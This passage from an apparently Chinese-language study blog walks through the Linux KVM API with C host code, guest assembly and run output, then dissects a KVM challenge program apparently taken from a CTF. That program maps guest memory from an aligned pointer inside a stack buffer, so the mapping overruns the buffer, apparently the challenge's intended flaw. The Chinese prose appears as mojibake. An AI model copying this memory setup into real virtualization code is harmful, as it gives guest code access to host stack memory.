class="comment">//æ­¤æ—¶vmæ‹¥æœ‰äº†å†…å­˜å’ŒVCPUï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨KVM_runé€‰é¡¹è®©vcpuæ¥è¿è¡Œè‡ªå·±çš„</span></span><br><span class="line">    <span class="comment">//codeäº†</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ret=ioctl(vcpufd,KVM_RUN,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret==<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;KVM_RUN fail&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">switch</span> (run-&gt;exit_reason)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> KVM_EXIT_HLT:</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;KVM_EXIT_HLT hahaha&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> KVM_EXIT_IO:</span><br><span class="line">            <span class="keyword">if</span>(</span><br><span class="line">                run-&gt;io.direction==KVM_EXIT_IO_OUT&amp;&amp;</span><br><span class="line">                run-&gt;io.size==<span class="number">1</span>&amp;&amp;</span><br><span class="line">                run-&gt;io.port==<span class="number">0x3f8</span>&amp;&amp;</span><br><span class="line">                run-&gt;io.count==<span class="number">1</span></span><br><span class="line">            )&#123;</span><br><span class="line">                <span class="built_in">putchar</span>(*(( (<span class="keyword">char</span> *)run)+run-&gt;io.data_offset));</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;KVM_EXIT_IO fail&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»“æœ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/kvmstudy/test1$ ./kvmpwn </span><br><span class="line">1KVM_EXIT_HLT hahaha</span><br></pre></td></tr></table></figure>

<p>ç¬¦åˆé¢„æœŸ</p>
<p>éªŒè¯ä¸€ä¸‹guestè¢«åˆ†é…çš„å†…å­˜æ˜¯å¦æ˜¯å®¿ä¸»è¿›ç¨‹ç»™ä»–çš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov al, 1</span><br><span class="line">add al,&#x27;0&#x27;</span><br><span class="line">mov dx, 0x3f8</span><br><span class="line">out dx, al</span><br><span class="line">mov al,0x20</span><br><span class="line">mov word [0x1000+0x20],&#x27;2&#x27;</span><br><span class="line">hlt</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> KVM_EXIT_HLT:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,((<span class="keyword">char</span> *)mem)+<span class="number">0x20</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;KVM_EXIT_HLT hahaha&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>ç»“æœ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/kvmstudy/test1$ ./kvmpwn</span><br><span class="line">12</span><br><span class="line">KVM_EXIT_HLT hahaha</span><br></pre></td></tr></table></figure>

<p>ç¬¦åˆé¢„æœŸ</p>
<h3 id="kvmæ·±å…¥å­¦ä¹ "><a href="#kvmæ·±å…¥å­¦ä¹ " class="headerlink" title="kvmæ·±å…¥å­¦ä¹ "></a>kvmæ·±å…¥å­¦ä¹ </h3><p>â€‹    ä¸Šé¢åªæ˜¯æ¯”è¾ƒç®€å•çš„kvmä½¿ç”¨æ–¹æ³•ï¼Œguestå¹¶æ²¡æœ‰å¼€è™šæ‹Ÿå†…å­˜æ˜ å°„ï¼Œç›´æ¥ä½¿ç”¨çš„æ˜¯ä»–çš„â€ç‰©ç†åœ°å€â€ï¼Œæ‰€ä»¥æ¯”è¾ƒå¥½ç†è§£ï¼Œæˆ‘æ‰¾è§äº†conf2020çš„ä¸€é“kvmæºç ï¼Œä»–æ•´äº†å¾ˆå¤šèŠ±æ´»ï¼Œæˆ‘ç¨å¾®æ”¹äº†æ”¹è®©ä»–èƒ½å¤Ÿè·‘èµ·æ¥ï¼Œæ¥ä¸‹æ¥çš„ä»»åŠ¡å°±æ˜¯ææ‡‚è¿™ä¸ªæºä»£ç </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kvm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* CR0 bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_PE 1u</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_MP (1U &lt;&lt; 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_EM (1U &lt;&lt; 2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_TS (1U &lt;&lt; 3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_ET (1U &lt;&lt; 4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_NE (1U &lt;&lt; 5)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_WP (1U &lt;&lt; 16)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_AM (1U &lt;&lt; 18)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_NW (1U &lt;&lt; 29)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_CD (1U &lt;&lt; 30)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR0_PG (1U &lt;&lt; 31)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CR4_PAE (1U &lt;&lt; 5)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EFER_LME (1U &lt;&lt; 8) <span class="comment">// Long mode enable</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EFER_LMA (1U &lt;&lt; 10) <span class="comment">// long mode active</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_n</span><span class="params">(<span class="keyword">int</span> count, <span class="keyword">void</span> *dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> to_read = count;</span><br><span class="line">    <span class="keyword">char</span> *dst_ptr = dst;</span><br><span class="line">    <span class="keyword">while</span> (to_read &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> read_res = read(<span class="number">0</span>, dst_ptr, to_read);</span><br><span class="line">        to_read -= read_res;</span><br><span class="line">        dst_ptr += read_res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_kvm_segment</span><span class="params">(struct kvm_segment *v1,struct kvm_segment *v2)</span></span>&#123;</span><br><span class="line">        v1-&gt;base =v2-&gt;base;</span><br><span class="line">        v1-&gt;limit = v2-&gt;limit;</span><br><span class="line">        v1-&gt;selector =v2-&gt;selector;</span><br><span class="line">        v1-&gt;present =v2-&gt;present;</span><br><span class="line">        v1-&gt;type =v2-&gt;type; <span class="comment">/* Code: execute, read, accessed */</span></span><br><span class="line">        v1-&gt;dpl = v2-&gt;dpl;</span><br><span class="line">        v1-&gt;db =v2-&gt;db;</span><br><span class="line">        v1-&gt;s =v2-&gt;s; <span class="comment">/* Code/data */</span></span><br><span class="line">        v1-&gt;l = v2-&gt;l;</span><br><span class="line">        v1-&gt;g =v2-&gt;g; <span class="comment">/* 4KB granularity */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> guest_mem[<span class="number">0x8000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;guest_mem, <span class="number">0</span>, <span class="number">0x8000</span>);</span><br><span class="line">    <span class="keyword">char</span> *aligned_guest_mem = guest_mem + (<span class="number">4096</span> - (<span class="keyword">size_t</span>)guest_mem % <span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> code_size = <span class="number">-1</span>;</span><br><span class="line">    read_n(<span class="keyword">sizeof</span>(<span class="number">4</span>), &amp;code_size);</span><br><span class="line">    <span class="keyword">if</span> (code_size &gt; <span class="number">0x4000</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\n[init] hold your horses&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read_n(code_size, aligned_guest_mem);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> kvm_fd = open(<span class="string">&quot;/dev/kvm&quot;</span>, O_CLOEXEC|O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> vm_fd = ioctl(kvm_fd, KVM_CREATE_VM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_userspace_memory_region</span> <span class="title">region</span> =</span> &#123;</span><br><span class="line">        .slot = <span class="number">0</span>,</span><br><span class="line">        .flags = <span class="number">0</span>,</span><br><span class="line">        .guest_phys_addr = <span class="number">0</span>,</span><br><span class="line">        .memory_size = <span class="number">0x8000</span>,</span><br><span class="line">        .userspace_addr = aligned_guest_mem</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(vm_fd, KVM_SET_USER_MEMORY_REGION, &amp;region);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> vcpu_fd = ioctl(vm_fd, KVM_CREATE_VCPU, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> vcpu_mmap_size = ioctl(kvm_fd, KVM_GET_VCPU_MMAP_SIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_run</span> *<span class="title">run_mem</span> =</span> mmap(<span class="literal">NULL</span>, vcpu_mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, vcpu_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_regs</span> <span class="title">guest_regs</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;guest_regs, <span class="number">0</span>, <span class="keyword">sizeof</span>(guest_regs));</span><br><span class="line">    guest_regs.rsp = <span class="number">0xff0</span>;</span><br><span class="line">    guest_regs.rflags = <span class="number">2</span>; <span class="comment">// required</span></span><br><span class="line">    ioctl(vcpu_fd, KVM_SET_REGS, &amp;guest_regs);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_sregs</span> <span class="title">guest_sregs</span>;</span></span><br><span class="line">    ioctl(vcpu_fd, KVM_GET_SREGS, &amp;guest_sregs);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Setup paging long mode.</span></span><br><span class="line">    guest_sregs.cr0 = CR0_PE | CR0_MP | CR0_ET | CR0_NE | CR0_WP | CR0_AM | CR0_PG;</span><br><span class="line">    guest_sregs.cr4 = CR4_PAE;</span><br><span class="line">    guest_sregs.efer = EFER_LMA | EFER_LME;</span><br><span class="line">    guest_sregs.cr3 = <span class="number">0x4000</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x4000</span>) = <span class="number">0x5003</span>; <span class="comment">// P4 Table[0]</span></span><br><span class="line">    *(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x5000</span>) = <span class="number">0x6003</span>; <span class="comment">// P3 Table[0]</span></span><br><span class="line">    *(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x6000</span>) = <span class="number">0x7003</span>; <span class="comment">// P2 Table[0]</span></span><br><span class="line">    *(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x7000</span>) = <span class="number">0x3</span>;    <span class="comment">// P1 Table[0]</span></span><br><span class="line">    *(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x7008</span>) = <span class="number">0x1003</span>; <span class="comment">// P1 Table[1]</span></span><br><span class="line">    *(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x7010</span>) = <span class="number">0x2003</span>; <span class="comment">// P1 Table[2]</span></span><br><span class="line">    *(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x7018</span>) = <span class="number">0x3003</span>; <span class="comment">// P1 Table[3]</span></span><br><span class="line">    <span class="comment">// meaning 0x0, 0x1000, 0x2000, 0x3000 are physical pages</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Setup segments</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_segment</span> <span class="title">seg</span> =</span> &#123;</span><br><span class="line">        .base = <span class="number">0</span>,</span><br><span class="line">        .limit = <span class="number">0xffffffff</span>,</span><br><span class="line">        .selector = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">        .present = <span class="number">1</span>,</span><br><span class="line">        .type = <span class="number">11</span>, <span class="comment">/* Code: execute, read, accessed */</span></span><br><span class="line">        .dpl = <span class="number">0</span>,</span><br><span class="line">        .db = <span class="number">0</span>,</span><br><span class="line">        .s = <span class="number">1</span>, <span class="comment">/* Code/data */</span></span><br><span class="line">        .l = <span class="number">1</span>,</span><br><span class="line">        .g = <span class="number">1</span>, <span class="comment">/* 4KB granularity */</span></span><br><span class="line">    &#125;;</span><br><span class="line">    copy_kvm_segment(&amp;(guest_sregs.cs),&amp;seg);</span><br><span class="line">	seg.type = <span class="number">3</span>; <span class="comment">/* Data: read/write, accessed */</span></span><br><span class="line">	seg.selector = <span class="number">2</span> &lt;&lt; <span class="number">3</span>;</span><br><span class="line">    copy_kvm_segment(&amp;(guest_sregs.ds),&amp;seg);</span><br><span class="line">    copy_kvm_segment(&amp;(guest_sregs.es),&amp;seg);</span><br><span class="line">    copy_kvm_segment(&amp;(guest_sregs.fs),&amp;seg);</span><br><span class="line">    copy_kvm_segment(&amp;(guest_sregs.gs),&amp;seg);</span><br><span class="line">    copy_kvm_segment(&amp;(guest_sregs.ss),&amp;seg);</span><br><span class="line">    ioctl(vcpu_fd, KVM_SET_SREGS, &amp;guest_sregs);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        ioctl(vcpu_fd, KVM_RUN, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (run_mem-&gt;exit_reason == KVM_EXIT_HLT || run_mem-&gt;exit_reason == KVM_EXIT_SHUTDOWN)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (run_mem-&gt;exit_reason == KVM_EXIT_IO) &#123;</span><br><span class="line">            <span class="keyword">if</span> (run_mem-&gt;io.direction == KVM_EXIT_IO_OUT &amp;&amp; run_mem-&gt;io.port == <span class="number">0x3f8</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%.*s&quot;</span>, </span><br><span class="line">                    run_mem-&gt;io.count * run_mem-&gt;io.size,</span><br><span class="line">                    run_mem-&gt;request_interrupt_window + run_mem-&gt;io.data_offset);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n[loop] exit reason: %d\n&quot;</span>, run_mem-&gt;exit_reason);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n[loop] goodbye!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆçœ‹äº†ä¸¤å¤©çš„ç†è®ºçŸ¥è¯†ï¼Œç»ˆäºèƒ½å®Œå…¨çœ‹æ‡‚ä¸Šé¢çš„kvmå®ä¾‹äº†ï¼Œä¸»è¦çš„éš¾ç‚¹åœ¨äºç†è§£vcpuçš„ç‰¹æ®Šå¯„å­˜å™¨çš„è®¾ç½®ä¸Š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">guest_sregs.cr0 = CR0_PE | CR0_MP | CR0_ET | CR0_NE | CR0_WP | CR0_AM | CR0_PG;</span><br><span class="line">guest_sregs.cr4 = CR4_PAE;</span><br><span class="line">guest_sregs.efer = EFER_LMA | EFER_LME;</span><br></pre></td></tr></table></figure>

<p>ä»–é¦–å…ˆè®¾ç½®äº†cr0å¯„å­˜å™¨ï¼Œè¿™ä¸ªå¯„å­˜å™¨æ˜¯æ§åˆ¶å¯„å­˜å™¨ï¼Œæ¯ä¸€ä½éƒ½æ˜¯ä¸€ä¸ªå¼€å…³ï¼Œå…¶ä¸­<code>CR0_PE</code>å°±æ˜¯å¼€èµ·äº†ä¿æŠ¤æ¨¡å¼ï¼Œ<code>CR0_PG</code>å¼€å¯äº†åˆ†é¡µç®¡ç†æ¨¡å¼ï¼Œç›¸å½“äºå¼€èµ·äº†MMUåœ°å€ç¿»è¯‘ï¼Œåç»­è¿˜ä¼šè®¾ç½®é¡µè¡¨å’Œcr3å¯„å­˜å™¨ï¼Œç„¶åcr4å¯„å­˜å™¨å’Œeferå¯„å­˜å™¨çš„è®¾ç½®éƒ½æ˜¯ä¸ºäº†å¼€å¯64ä½æ¨¡å¼ï¼Œå› ä¸ºå¦‚æœå¼€å¯äº†ä¿æŠ¤æ¨¡å¼é»˜è®¤æ˜¯32ä½çš„ã€‚è¿™å—å¤šäºäº†xxrwå­¦é•¿æ‰ç†è§£ã€‚è†œ</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220718125951256.png" alt="image-20220718125951256"></p>
<p>ç„¶åä»–è®¾ç½®äº†cr3å¯„å­˜å™¨ç„¶ååˆå§‹åŒ–äº†å››çº§é¡µè¡¨,ç†è§£è¿™å—å¾—éœ€è¦æ“ä½œç³»ç»Ÿä¸­è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€ç¿»è¯‘çš„çŸ¥è¯†ï¼Œå‰ä¸‰çº§é¡µè¡¨éƒ½åªæœ‰ä¸€ä¸ªé¡µè¡¨é¡¹ï¼ŒæŒ‡å‘ä¸‹ä¸€çº§é¡µè¡¨ï¼Œç¬¬å››çº§é¡µè¡¨çš„é¡µè¡¨é¡¹è®°å½•çš„æ˜¯<code>ç‰©ç†åœ°å€</code>ï¼Œä¸€å…±æœ‰å››é¡¹ï¼Œ0,1,2,3,æ‰€ä»¥ä¸€å…±å¯ä»¥ç¿»è¯‘4*4kçš„é¡µé¢ï¼Œæ¯”å¦‚0x0å°±ä¼šè½å…¥ç¬¬å››çº§é¡µè¡¨çš„ç¬¬0é¡¹ï¼Œæœ€åç¿»è¯‘æˆç‰©ç†åœ°å€ä¹Ÿæ˜¯0,0x2000å°±ä¼šè½å…¥ç¬¬å››çº§é¡µè¡¨çš„ç¬¬2é¡¹ï¼Œæœ€åç¿»è¯‘çš„ç‰©ç†åœ°å€æ˜¯0x2000,æ‰€ä»¥è¿™ä¸ªé¡µè¡¨ç¿»è¯‘äº†å’Œæ²¡ç¿»è¯‘å·®ä¸å¤šã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">guest_sregs.cr3 = <span class="number">0x4000</span>;</span><br><span class="line">*(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x4000</span>) = <span class="number">0x5003</span>; <span class="comment">// P4 Table[0]</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x5000</span>) = <span class="number">0x6003</span>; <span class="comment">// P3 Table[0]</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x6000</span>) = <span class="number">0x7003</span>; <span class="comment">// P2 Table[0]</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x7000</span>) = <span class="number">0x3</span>;    <span class="comment">// P1 Table[0]</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x7008</span>) = <span class="number">0x1003</span>; <span class="comment">// P1 Table[1]</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x7010</span>) = <span class="number">0x2003</span>; <span class="comment">// P1 Table[2]</span></span><br><span class="line">*(<span class="keyword">size_t</span>*)(aligned_guest_mem + <span class="number">0x7018</span>) = <span class="number">0x3003</span>; <span class="comment">// P1 Table[3]</span></span><br><span class="line"><span class="comment">// meaning 0x0, 0x1000, 0x2000, 0x3000 are physical pages</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±æ˜¯æ®µå¯„å­˜å™¨çš„è®¾ç½®äº†ï¼Œä½¿ç”¨çš„æ˜¯<code>kvm_segment</code>ç»“æ„ä½“ï¼Œæˆ‘çš„ç†è§£è¿™ä¸ä»…æ˜¯å¯¹cså¯„å­˜å™¨çš„è®¾ç½®ï¼Œæ›´å‡†ç¡®çš„è¯´æ˜¯å¯¹æ®µæè¿°ç¬¦çš„è®¾ç½®ï¼Œè¿™ä¸ª<code>kvm_segment</code>å°±æ˜¯å¯¹æ®µæè¿°ç¬¦çš„è™šæ‹Ÿï¼Œå…¶ä¸­baseå°±æ˜¯æ®µæè¿°ç¬¦çš„åŸºå€ï¼Œlimitæ˜¯æ®µæè¿°ç¬¦çš„é•¿åº¦ï¼Œä»–å’Œ<code>g</code>æ­é…ä½¿ç”¨å½“g=1æ—¶ï¼Œæ®µçš„é•¿åº¦æ˜¯ä»¥4kä¸ºå•ä½çš„ï¼Œæ‰€ä»¥æ®µçš„æœ€å¤§å¤§å°å°±æ˜¯2^32*4K,å¦‚æœg=0,æ®µçš„é•¿åº¦å°±æ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½çš„ã€‚selectorå’Œpresentä¸æ¸…æ¥šï¼Œtypeå°±æ˜¯è®¾ç½®æ®µæ˜¯ä»€ä¹ˆæ®µï¼Œä¸‹é¢çš„ä»£ç è¡¨ç¤ºæ˜¯ä»£ç æ®µï¼Œæ®µæè¿°ç¬¦æ˜¯ä¿æŠ¤æ¨¡å¼å¿…è¦çš„è¦ç´ ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_segment</span> <span class="title">seg</span> =</span> &#123;</span><br><span class="line">    .base = <span class="number">0</span>,</span><br><span class="line">    .limit = <span class="number">0xffffffff</span>,</span><br><span class="line">    .selector = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">    .present = <span class="number">1</span>,</span><br><span class="line">    .type = <span 